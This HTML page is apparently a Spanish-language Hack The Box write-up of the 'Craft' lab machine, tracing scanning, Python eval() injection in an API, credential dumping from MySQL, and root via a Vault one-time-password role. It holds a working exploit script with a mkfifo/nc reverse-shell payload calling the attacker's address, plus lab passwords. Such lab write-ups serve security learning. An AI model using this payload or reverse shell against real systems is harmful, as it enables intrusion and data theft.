<!DOCTYPE html>
<html lang="en">
<head>
  
    <title>Hack The Box - Craft :: sckull — HackTheBox Writeups, CTF</title>    
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
<meta name="description" content="Nombre Craft     OS Linux   Puntos 30   Dificultad Media   IP 10.10.10.110   Maker rotarydrone      new Chart(document.getElementById(&#34;radar-chart&#34;), { type: &#39;radar&#39;, data: { labels: [&#34;Enumeration&#34;, &#34;Real-Life&#34;, &#34;CVE&#34;, &#34;Custom Exploitation&#34;, &#34;CTF-Like&#34;], datasets: [ { label: &#34;User&#34;, fill: true, backgroundColor: &#34;rgba(179,181,198,0.2)&#34;, borderColor: &#34;rgba(179,181,198,1)&#34;, pointBorderColor: &#34;#fff&#34;, pointBackgroundColor: &#34;rgba(179,181,198,1)&#34;, data: [7.7, 8.9, 3.8, 6.2, 1.1] }, { label: &#34;"/>
<meta name="keywords" content=""/>
<meta name="robots" content="noodp"/>
<link rel="canonical" href="/posts/craft/" />


<link rel="stylesheet" href="/assets/style.css">


<link rel="stylesheet" href="/style.css">


<link rel="shortcut icon" href="/img/favicon.png">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
<script src="https://kit.fontawesome.com/57784fec54.js" crossorigin="anonymous"></script>


<meta name="twitter:card" content="summary" />
<meta name="twitter:title" content="Hack The Box - Craft :: sckull — HackTheBox Writeups, CTF" />
<meta name="twitter:description" content="Nombre Craft     OS Linux   Puntos 30   Dificultad Media   IP 10.10.10.110   Maker rotarydrone      new Chart(document.getElementById(&#34;radar-chart&#34;), { type: &#39;radar&#39;, data: { labels: [&#34;Enumeration&#34;, &#34;Real-Life&#34;, &#34;CVE&#34;, &#34;Custom Exploitation&#34;, &#34;CTF-Like&#34;], datasets: [ { label: &#34;User&#34;, fill: true, backgroundColor: &#34;rgba(179,181,198,0.2)&#34;, borderColor: &#34;rgba(179,181,198,1)&#34;, pointBorderColor: &#34;#fff&#34;, pointBackgroundColor: &#34;rgba(179,181,198,1)&#34;, data: [7.7, 8.9, 3.8, 6.2, 1.1] }, { label: &#34;" />
<meta name="twitter:site" content="/" />
<meta name="twitter:creator" content="sckull" />
<meta name="twitter:image" content="/image/htb/craft/cover.png">





<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Hack The Box - Craft :: sckull — HackTheBox Writeups, CTF">
<meta property="og:description" content="Nombre Craft     OS Linux   Puntos 30   Dificultad Media   IP 10.10.10.110   Maker rotarydrone      new Chart(document.getElementById(&#34;radar-chart&#34;), { type: &#39;radar&#39;, data: { labels: [&#34;Enumeration&#34;, &#34;Real-Life&#34;, &#34;CVE&#34;, &#34;Custom Exploitation&#34;, &#34;CTF-Like&#34;], datasets: [ { label: &#34;User&#34;, fill: true, backgroundColor: &#34;rgba(179,181,198,0.2)&#34;, borderColor: &#34;rgba(179,181,198,1)&#34;, pointBorderColor: &#34;#fff&#34;, pointBackgroundColor: &#34;rgba(179,181,198,1)&#34;, data: [7.7, 8.9, 3.8, 6.2, 1.1] }, { label: &#34;" />
<meta property="og:url" content="/posts/craft/" />
<meta property="og:site_name" content="Hack The Box - Craft" />
<meta property="og:image" content="/image/htb/craft/cover.png">
<meta property="og:image:width" content="2048">
<meta property="og:image:height" content="1024">

<meta name="google-site-verification" content="cug_0s4kFi5UbEfBI5hJsscmJ7XdimqECCYfN1EAZq0" />


<script type="application/ld+json">
    {
        "@context" : "http://schema.org",
        "@type" : "BlogPosting",
        "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "/"
        },
        "articleSection" : "posts",
        "name" : "Hack The Box - Craft",
        "headline" : "Hack The Box - Craft",
        "description" : "Nombre Craft     OS Linux   Puntos 30   Dificultad Media   IP 10.10.10.110   Maker rotarydrone      new Chart(document.getElementById("radar-chart"), { type: 'radar', data: { labels: ["Enumeration", "Real-Life", "CVE", "Custom Exploitation", "CTF-Like"], datasets: [ { label: "User", fill: true, backgroundColor: "rgba(179,181,198,0.2)", borderColor: "rgba(179,181,198,1)", pointBorderColor: "#fff", pointBackgroundColor: "rgba(179,181,198,1)", data: [7.7, 8.9, 3.8, 6.2, 1.1] }, { label: "",
        "inLanguage" : "en-US",
        "author" : "",
        "creator" : "",
        "publisher": "",
        "accountablePerson" : "",
        "copyrightHolder" : "",
        "copyrightYear" : "2020",
        "datePublished": "2020-01-04 00:00:00 &#43;0000 UTC",
        "dateModified" : "2020-01-04 00:00:00 &#43;0000 UTC",
        "url" : "/posts/craft/",
        "wordCount" : "1524",
        "keywords" : [ "hackthebox","Blog" ]
    }
    </script>


<meta property="article:published_time" content="2020-01-04 00:00:00 &#43;0000 UTC" />




<a name="top"></a>
</head>

<body class="dark-theme">
  
<div class="container">
  <header class="header">
  <span class="header__inner">
    <a href="/" class="logo" style="text-decoration: none;">
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" width="44" height="44" viewBox="0 0 44 44">
  <polyline fill="none" stroke="#fff" stroke-width="2" points="15 8 29.729 22.382 15 35.367"/>
</svg>
</span>
    <span class="logo__text">sckull | blog</span>
    <span class="logo__cursor"></span>
  
</a>

    <span class="header__right">
      
        <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
    
      
        
                   

          

          

          
            <li><a href="/about">About</a></li>
          

        
      
        
                   

          
            <li><a href="/tags/hackthebox/"><img class="icon" src="/hackthebox.ico" width="32" title="HackTheBox"></a></li>
          

          

          

        
      
        
                   

          

          
            <li><a href="/tags/tryhackme/"><img class="icon" src="/thm.ico" width="32" title="TryHackMe"></a></li>
          

          

        
      
      
    
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        

          

          

          
            <li><a href="/about">About</a></li>
          

      
    
      
        

          
            <li><a href="/tags/hackthebox/"><img class="icon" src="/hackthebox.ico" width="32" title="HackTheBox"></a></li>
          

          

          

      
    
      
        

          

          
            <li><a href="/tags/tryhackme/"><img class="icon" src="/thm.ico" width="32" title="TryHackMe"></a></li>
          

          

      
    
  </ul>
</nav>

        <span class="menu-trigger">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
            <path d="M0 0h24v24H0z" fill="none"/>
            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
          </svg>
        </span>
      
      
    </span>
  </span>
  <link rel="shortcut icon" href="https://sckullbock.blogspot.com/favicon.ico">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/2.5.0/Chart.min.js"></script>
</header>

  
  <div class="content">    
    

  <div class="post">
    <h2 class="post-title">Hack The Box - Craft</h2>
    <div class="post-meta">
      
        <span class="post-date">
          <i class="fas fa-calendar-week"></i>
            Saturday, Jan 4, 2020
        </span>
      
      <span class="post-author">— Written by sckull</span>
      
        <span class="post-read-time">— 8 min read</span>
      
    </div>
        
    
      <span class="post-tags">
        
         <a class="button-tag" href="/tags/hackthebox/"><li class="fa fa-tag"></li> hackthebox</a>&nbsp;
        
      </span>
    

    
      
        <img src="/posts/craft/../../image/htb/craft/cover.png" class="post-cover center" />
      
      <hr />
     
    

    <div class="contenido">
      <h2>Contenido</h2>
      <nav id="TableOfContents">
<ul>
<li>
<ul>
<li><a href="#masscan">MASSCAN</a></li>
<li><a href="#nmap">NMAP</a></li>
<li><a href="#https">HTTPS</a>
<ul>
<li>
<ul>
<li><a href="#subdominios">Subdominios</a></li>
<li><a href="#https-api-craft-htb-api"><a href="https://api.craft.htb/api/">https://api.craft.htb/api/</a></a></li>
<li><a href="#https-gogs-craft-htb"><a href="https://gogs.craft.htb/">https://gogs.craft.htb/</a></a></li>
</ul></li>
</ul></li>
<li><a href="#craft-api">CRAFT API</a></li>
<li><a href="#rce-craft-api">RCE - Craft API</a>
<ul>
<li><a href="#mysql-dump-credentials">MYSQL - Dump Credentials</a></li>
</ul></li>
<li><a href="#user-gilfoyle-shell-ssh">USER gilfoyle - SHELL SSH</a></li>
<li><a href="#privilege-escalation">PRIVILEGE ESCALATION</a>
<ul>
<li><a href="#ssh">SSH</a></li>
<li><a href="#local">Local</a></li>
</ul></li>
<li><a href="#root-one-time-password">ROOT - One Time Password</a></li>
</ul></li>
</ul>
</nav>
    </div>

    <div class="post-content">      
      

<table>
<thead>
<tr>
<th>Nombre</th>
<th>Craft</th>
</tr>
</thead>

<tbody>
<tr>
<td>OS</td>
<td>Linux</td>
</tr>

<tr>
<td>Puntos</td>
<td>30</td>
</tr>

<tr>
<td>Dificultad</td>
<td>Media</td>
</tr>

<tr>
<td>IP</td>
<td>10.10.10.110</td>
</tr>

<tr>
<td>Maker</td>
<td><a href="https://www.hackthebox.eu/home/users/profile/3067">rotarydrone</a></td>
</tr>
</tbody>
</table>

<div id="grapher"><canvas id="radar-chart" width="100" height="50"></canvas>
    <script>
    new Chart(document.getElementById("radar-chart"), {
    type: 'radar',
    data: {
      labels: ["Enumeration", "Real-Life", "CVE", "Custom Exploitation", "CTF-Like"],
      datasets: [
        {
          label: "User",
          fill: true,
          backgroundColor: "rgba(179,181,198,0.2)",
          borderColor: "rgba(179,181,198,1)",
          pointBorderColor: "#fff",
          pointBackgroundColor: "rgba(179,181,198,1)",
          data: [7.7, 8.9, 3.8, 6.2, 1.1]
        }, {
          label: "Maker",
          fill: true,
          backgroundColor: "rgba(255,99,132,0.2)",
          borderColor: "rgba(255,99,132,1)",
          pointBorderColor: "#fff",
          pointBackgroundColor: "rgba(255,99,132,1)",
          pointBorderColor: "#fff",
          data: [6, 10, 1, 9, 0]
        }
      ]
    },
    options: {
      title: {
        display: true,
        text: 'Calificacion'
      }
    }
});
    </script>
</div>

<hr />

<h2 id="masscan">MASSCAN</h2>

<pre><code class="language-bash">masscan -p1-65535,U:1-65535 10.10.10.110 --rate=1000 -e tun0               

Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-07-30 06:56:40 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 22/tcp on 10.10.10.110
Discovered open port 443/tcp on 10.10.10.110
Discovered open port 6022/tcp on 10.10.10.110
</code></pre>

<h2 id="nmap">NMAP</h2>

<pre><code class="language-bash"># Nmap 7.70 scan initiated Tue Jul 30 03:13:35 2019 as: nmap -sV -sC -p 22,443,6022 -o nmap.scan 10.10.10.110
Nmap scan report for 10.10.10.110
Host is up (0.13s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 7.4p1 Debian 10+deb9u5 (protocol 2.0)
| ssh-hostkey: 
|   2048 bd:e7:6c:22:81:7a:db:3e:c0:f0:73:1d:f3:af:77:65 (RSA)
|   256 82:b5:f9:d1:95:3b:6d:80:0f:35:91:86:2d:b3:d7:66 (ECDSA)
|_  256 28:3b:26:18:ec:df:b3:36:85:9c:27:54:8d:8c:e1:33 (ED25519)
443/tcp  open  ssl/http nginx 1.15.8
|_http-server-header: nginx/1.15.8
|_http-title: About
| ssl-cert: Subject: commonName=craft.htb/organizationName=Craft/stateOrProvinceName=NY/countryName=US
| Not valid before: 2019-02-06T02:25:47
|_Not valid after:  2020-06-20T02:25:47
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
6022/tcp open  ssh      (protocol 2.0)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-Go
| ssh-hostkey: 
|_  2048 5b:cc:bf:f1:a1:8f:72:b0:c0:fb:df:a3:01:dc:a6:fb (RSA)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port6022-TCP:V=7.70%I=7%D=7/30%Time=5D3FEE27%P=x86_64-pc-linux-gnu%r(NU
SF:LL,C,&quot;SSH-2\.0-Go\r\n&quot;);
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jul 30 03:14:26 2019 -- 1 IP address (1 host up) scanned in 51.23 seconds
</code></pre>

<h2 id="https">HTTPS</h2>

<p>Visitamos la pagina en HTTPS nos muestra un mensaje que nos habla de una rest API.</p>

<p><img src="../../image/htb/craft/Screenshot from 2019-07-31 01.12.04.png" alt="image" /></p>

<h4 id="subdominios">Subdominios</h4>

<p>Nos movilizamos atravez de las diferentes rutas que nos provee la pagina y encontramos un dominio y dos subdominios, los cuales agregamos a nuestro archivo <code>/etc/hosts</code>.</p>

<pre><code>craft.htb
api.craft.htb
gogs.craft.htb
</code></pre>

<p><img src="../../image/htb/craft/Screenshot from 2019-07-31 01.14.08.png" alt="image" /></p>

<h4 id="https-api-craft-htb-api"><a href="https://api.craft.htb/api/">https://api.craft.htb/api/</a></h4>

<p>En la pagina de api nos meustra distintas opciones con las cuales podemos interactuar con una interfaz y tambien nos provee diferentes comandos con curl, para hacer solicitudes a la API.</p>

<p><img src="../../image/htb/craft/Screenshot from 2019-07-31 01.20.25.png" alt="image" /></p>

<h4 id="https-gogs-craft-htb"><a href="https://gogs.craft.htb/">https://gogs.craft.htb/</a></h4>

<p>En la pagina de gogs nos encontramos con la plataforma gogs que permite el gestionamiento de repositorios, dentro de la misma plataforma nos encontramos con un repositorio.</p>

<p><img src="../../image/htb/craft/Screenshot from 2019-07-31 01.21.08.png" alt="image" /></p>

<h2 id="craft-api">CRAFT API</h2>

<p>Analizamos el codigo que se encuentra en el repositorio el cual pertenece a la rest API que nos menciona la pagina principal (<code>craft.htb</code>), contiene toda la estructura de como funciona esta API. Dentro, encontramos que se hizo un cambio a una parte de codigo que pertenece a la creacion de un nuevo <code>brew</code> de la API.</p>

<p><img src="../../image/htb/craft/Screenshot from 2019-07-31 01.30.27.png" alt="image" /></p>

<p>Dicho cambio incluye una porcion de codigo de python que es vulnerable a ejecucion de comandos remota o RCE.</p>

<p>Porcion de codigo vulnerable especificamente <code>eval()</code>:</p>

<pre><code class="language-python">if eval('%s &gt; 1' % request.json['abv']):
	return &quot;ABV must be a decimal value less than 1.0&quot;, 400
</code></pre>

<p><a href="https://sethsec.blogspot.com/2016/11/exploiting-python-code-injection-in-web.html"><strong>Python Code Injection</strong></a></p>

<p>Ademas de eso encontramos un archivo test.py que contiene un usuario y contraseña para generar un token, para luego crear un &lsquo;brew&rsquo; insatisfactorio y satisfactoriamente. El primero contiene un numero con punto decimal mayor a 1 que debe de ser rechazado por la API. El segundo un numero menor a 1 con punto decimal que debe de ser aceptado por la API.</p>

<p>Archivo test.py:</p>

<pre><code class="language-python">#!/usr/bin/env python

import requests
import json

response = requests.get('https://api.craft.htb/api/auth/login',  auth=('dinesh', '4aUh0A8PbVJxgd'), verify=False)
json_response = json.loads(response.text)
token =  json_response['token']

headers = { 'X-Craft-API-Token': token, 'Content-Type': 'application/json'  }

# make sure token is valid
response = requests.get('https://api.craft.htb/api/auth/check', headers=headers, verify=False)
print(response.text)

# create a sample brew with bogus ABV... should fail.

print(&quot;Create bogus ABV brew&quot;)
brew_dict = {}
brew_dict['abv'] = '15.0'
brew_dict['name'] = 'bullshit'
brew_dict['brewer'] = 'bullshit'
brew_dict['style'] = 'bullshit'

json_data = json.dumps(brew_dict)
response = requests.post('https://api.craft.htb/api/brew/', headers=headers, data=json_data, verify=False)
print(response.text)


# create a sample brew with real ABV... should succeed.
print(&quot;Create real ABV brew&quot;)
brew_dict = {}
brew_dict['abv'] = '0.15'
brew_dict['name'] = 'bullshit'
brew_dict['brewer'] = 'bullshit'
brew_dict['style'] = 'bullshit'

json_data = json.dumps(brew_dict)
response = requests.post('https://api.craft.htb/api/brew/', headers=headers, data=json_data, verify=False)
print(response.text)
</code></pre>

<p>Prueba del archivo test.py:
<img src="../../image/htb/craft/Screenshot from 2019-07-31 01.37.11.png" alt="image" /></p>

<h2 id="rce-craft-api">RCE - Craft API</h2>

<p>Para poder ejecutar comandos y obtener una shell inversa a travez de la vulnerabilidad que encontramos en el codigo del repositorio vamos a modificar el archivo <code>test.py</code>, agregandole un comando que va a ser ejecutado por la funcion <strong>eval()</strong>. Agregamos nuestra shell inversa &ldquo;escapando&rdquo; todas los backslash que se encuentran para no tener ningun problema al ejecutarse. Y Ponemos a la escucha nuestra maquina.</p>

<pre><code class="language-python">#!/usr/bin/env python
import requests
import json

response = requests.get('https://api.craft.htb/api/auth/login',  auth=('dinesh', '4aUh0A8PbVJxgd'), verify=False)
json_response = json.loads(response.text)
token =  json_response['token']
headers = { 'X-Craft-API-Token': token, 'Content-Type': 'application/json'  }
# make sure token is valid
response = requests.get('https://api.craft.htb/api/auth/check', headers=headers, verify=False)
print(response.text)

a = &quot;__import__('os').popen('rm \/tmp\/f;mkfifo \/tmp\/f;cat \/tmp\/f|\/bin\/sh -i 2&gt;&amp;1|nc 10.10.14.184 8878 &gt;\/tmp\/f').read()&quot;

# create a sample brew with real ABV... should succeed.
print(&quot;Create real ABV brew&quot;)
brew_dict = {}
brew_dict['abv'] = a
brew_dict['name'] = 'bullshit'
brew_dict['brewer'] = 'bullshit'
brew_dict['style'] = 'bullshit'
json_data = json.dumps(brew_dict)
response = requests.post('https://api.craft.htb/api/brew/', headers=headers, data=json_data, verify=False)
print(response.text)
</code></pre>

<p>Al ejecutar el script obtenemos una shell inversa:
<img src="../../image/htb/craft/Screenshot from 2019-07-31 01.44.04.png" alt="image" /></p>

<h3 id="mysql-dump-credentials">MYSQL - Dump Credentials</h3>

<p>Dentro del sistema de archivos encontramos los mismos archivos pertenecientes al repositorio, al ejecutar el archivo de <code>dbtest.py</code> obtenemos una respuesta de la base de datos MySQL.</p>

<p>Archivos:
<img src="../../image/htb/craft/Screenshot from 2019-07-31 01.52.00.png" alt="image" /></p>

<p>Prueba dbtest.py
<img src="../../image/htb/craft/Screenshot from 2019-07-31 01.53.04.png" alt="image" /></p>

<p>Archivo settings.py con credenciales de la base de datos:
<img src="../../image/htb/craft/Screenshot from 2019-07-31 02.03.52.png" alt="image" /></p>

<p>Para poder obtener Credenciales que se encuentran en la base de datos utilizamos nuevamente el repositorio, ya que en este se encuentra el modelo de las tablas de la base de datos, brew y user, por lo que podemos obtener facilmente las columnas y el nombre de las tablas.</p>

<p><strong>craft_api/database/models.py</strong></p>

<p><img src="../../image/htb/craft/Screenshot from 2019-07-31 01.55.08.png" alt="image" /></p>

<p>Para realizar un query a la base de datos utilizamos y modificamos el archivo <code>dbtest.py</code>:</p>

<pre><code class="language-python">#!/usr/bin/env python
import pymysql
import sys
from craft_api import settings

connection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST,
    user=settings.MYSQL_DATABASE_USER,
    password=settings.MYSQL_DATABASE_PASSWORD,
    db=settings.MYSQL_DATABASE_DB,
    cursorclass=pymysql.cursors.DictCursor)

try:    
    with connection.cursor() as cursor:
        sql = sys.argv[1]
        cursor.execute(sql)
        result = cursor.fetchall()
        print(result)
finally:
    connection.close()
</code></pre>

<p>Teniendo nuestro archivo listo utilizamos el siguiente query para obtener los datos:</p>

<pre><code class="language-sql">SELECT * FROM user
</code></pre>

<p>Archivo dbtest.py modificado:
<img src="../../image/htb/craft/Screenshot from 2019-07-31 02.00.23.png" alt="image" /></p>

<p>Obtenemos las credenciales que estan dentro de la base de datos, una de ellas ya la teniamos dentro del script test.py:</p>

<pre><code class="language-js">[
   {
      'id':1,
      'username':'dinesh',
      'password':'4aUh0A8PbVJxgd'
   },
   {
      'id':4,
      'username':'ebachman',
      'password':'llJ77D8QFkLPQB'
   },
   {
      'id':5,
      'username':'gilfoyle',
      'password':'ZEU3N8WNM2rh4T'
   }
]
</code></pre>

<h2 id="user-gilfoyle-shell-ssh">USER gilfoyle - SHELL SSH</h2>

<p>Obtuvimos las credenciales de 3 &ldquo;usuarios&rdquo;, ninguno de ellos funciona en el servicio de SSH, pero dos de ellos si funcionan en la plataforma Gogs.</p>

<p>Por un lado tenemos al usuario dinesh quien puede realizar cambios dentro del codigo del repositorio de la API de craft.</p>

<p>Con el usuario gilfoyle nos muestra un repositorio más al del usuario dinesh este nos muestra como esta la infraestructura del &lsquo;servidor&rsquo;. Entre las cosas que tiene este repositorio encontramos el &lsquo;craft-flask&rsquo; el cual contiene la informacion para la Shell de privilegios bajos con la que pudimos obtener las credenciales, y, tambien informacion del servidor nginx, mysql, vault y ssh.</p>

<p>En la carpeta .ssh encontramos la clave publica y privada del usuario gilfoyle perteneciente al servicio de SSH, utilizamos dicha clave para obtener una shell SSH. Al utilizar la clave nos pide una frase utilizamos la contraseña (<code>ZEU3N8WNM2rh4T</code>) que encontramos en la base de datos de este usuario.</p>

<p><img src="../../image/htb/craft/Screenshot from 2019-07-31 02.16.57.png" alt="image" /></p>

<p>Obtenemos una shell y nuestra flag <code>user.txt</code>.</p>

<h2 id="privilege-escalation">PRIVILEGE ESCALATION</h2>

<p>Nuevamente volvemos al repositorio donde encontramos la infraestructura que tiene el servidor, dentro, encontramos en la carpeta vault la configuracion de esta plataforma, esta plataforma da el acceso y control de contraseñas, certificados, claves de APIs, contraseñas, etc.</p>

<p><img src="../../image/htb/craft/Screenshot from 2019-08-08 02.27.15.png" alt="image" /></p>

<pre><code class="language-js">    storage &quot;file&quot; {
        path = &quot;/vault/data&quot;
      }
    ui = false
    listener &quot;tcp&quot; {
      address = &quot;0.0.0.0:8200&quot;
      tls_cert_file = &quot;/vault/pki/vault.craft.htb.crt&quot;
      tls_key_file = &quot;/vault/pki/vault.craft.htb.key&quot;
      tls_min_version = &quot;tls12&quot;
    }
</code></pre>

<p>Revisamos la documentacion de esta plataforma y las opciones que contiene este archivo. Encontramos que la plataforma esta corriendo en el puerto 8200 y su interfaz grafica (ui) esta desactivada. Dentro de la maquina especificamente en el archivo <code>/etc/hosts</code> encontramos que la plataforma esta configurada en la ip y dominio:</p>

<pre><code class="language-bash">172.20.0.2 vault.craft.htb
</code></pre>

<p><img src="../../image/htb/craft/Screenshot from 2019-08-08 02.31.27.png" alt="image" /></p>

<p>Comprobamos que la interfaz grafica este desactivada traemos <code>172.20.0.2</code> con el puerto <code>8200</code> localmente:</p>

<pre><code class="language-bash">ssh -L 8200:172.20.0.2:8200 gilfoyle@10.10.10.110 -i gilfoyle_id_rsa
</code></pre>

<h3 id="ssh">SSH</h3>

<p><img src="../../image/htb/craft/Screenshot from 2019-08-08 02.34.50.png" alt="image" /></p>

<h3 id="local">Local</h3>

<p>Pudimos comprobar que la plataforma esta desactivada graficamente.
<img src="../../image/htb/craft/Screenshot from 2019-08-08 02.36.26.png" alt="image" /></p>

<h2 id="root-one-time-password">ROOT - One Time Password</h2>

<p>One time password permite a algun usuario crear una contraseña cada vez que lo desee conectarse en el servicio SSH mediante comandos. De igual forma dentro del repositorio encontramos un archivo llamado <code>secret.sh</code> el cual contiene una configuracion para activar ssh, crear un Rol con el usuario root con las IP que se representen dentro de <code>cidr_list</code>.</p>

<p><a href="https://www.vaultproject.io/docs/secrets/ssh/one-time-ssh-passwords.html"><strong>One Time SSH</strong></a></p>

<pre><code class="language-js">vault secrets enable ssh

vault write ssh/roles/root_otp \
    key_type=otp \
    default_user=root \
    cidr_list=0.0.0.0/0
</code></pre>

<p><img src="../../image/htb/craft/Screenshot from 2019-08-08 02.55.53.png" alt="image" /></p>

<p>Utilizamos el archivo <code>secrets.sh</code>, lo modificamos y lo ejecutamos:</p>

<pre><code class="language-js">vault secrets enable ssh

vault write ssh/roles/root_otp \
    key_type=otp \
    default_user=root \
    cidr_list=172.20.0.0/0
</code></pre>

<p>Creamos una credencial para nuestra ip con el rol de root_otp.</p>

<pre><code class="language-js">vault write ssh/creds/root_otp ip=172.20.0.1
</code></pre>

<p>Cuando creamos nuestra credencial nos muestra los detalles:</p>

<p><img src="../../image/htb/craft/Screenshot from 2019-08-08 02.58.34.png" alt="image" /></p>

<p>Utilizamos la clave (key) como contraseña:</p>

<pre><code>key: 70a2c9bc-4644-8bbd-f010-0c08193a3b7f
</code></pre>

<p>Nos conectamos mediante ssh al usuario root localmente (0.0.0.0):</p>

<pre><code>ssh root@0.0.0.0
</code></pre>

<p>Obtenemos una shell como usuario root y nuestra flag <code>root.txt</code>:</p>

<p><img src="../../image/htb/craft/Screenshot from 2019-08-08 03.00.43.png" alt="image" /></p>

    </div>    
    <hr />
    
    <div>
      
        
<div id="disqus_thread"></div>
<script>
(function() {
var d = document, s = d.createElement('script');
s.src = 'https://sckull.disqus.com/embed.js';
s.setAttribute('data-timestamp', +new Date());
(d.head || d.body).appendChild(s);
})();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>

      
      
    </div>

    
      <div class="pagination">
        <div class="pagination__title">
          <span class="pagination__title-h">Read other posts</span>
          <hr />
        </div>
        <div class="pagination__buttons">
          
            <span class="button previous">
              <a href="/posts/bitlab/">
                <span class="button__icon">←</span>
                <span class="button__text">Hack The Box - Bitlab</span>
              </a>
            </span>
          
          
            <span class="button next">
              <a href="/posts/blueprint/">
                <span class="button__text">TryHackMe - Blueprint</span>
                <span class="button__icon">→</span>
              </a>
            </span>
          
        </div>
      </div>
      
    
    
    
  </div>
  
    
  </div>
  
  
    <footer class="footer">
  <div class="footer__inner">
    
      <a href="/" class="logo" style="text-decoration: none;">
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" width="44" height="44" viewBox="0 0 44 44">
  <polyline fill="none" stroke="#fff" stroke-width="2" points="15 8 29.729 22.382 15 35.367"/>
</svg>
</span>
    <span class="logo__text">sckull | blog</span>
    <span class="logo__cursor"></span>
  
</a>

      <div class="copyright">
        <span style="font-size: 0.85em;">© 2020 sckull</span>
        
      
      </div>
    
  </div>
</footer>

<script src="/assets/main.js"></script>
<script src="/assets/prism.js"></script>

  
  
  
  <a class="float" id="myBtn" href="#top"><i class="fa fa-arrow-up" aria-hidden="true"></i></a>
  
</div>






</body>
</html>
